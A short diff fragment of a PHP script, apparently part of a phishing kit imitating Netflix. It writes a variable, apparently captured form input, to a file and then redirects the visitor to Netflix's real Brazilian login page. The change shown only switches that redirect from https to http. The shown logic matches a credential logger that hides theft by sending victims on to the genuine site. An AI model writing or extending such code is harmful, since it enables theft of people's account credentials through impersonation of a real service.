@@ -9,5 +9,5 @@ $escrever2 = fwrite($file, $caixa2);
 
 fclose($file);
 
-header("Location: https://www.netflix.com/br/login");
+header("Location: http://www.netflix.com/br/login");
 ?>
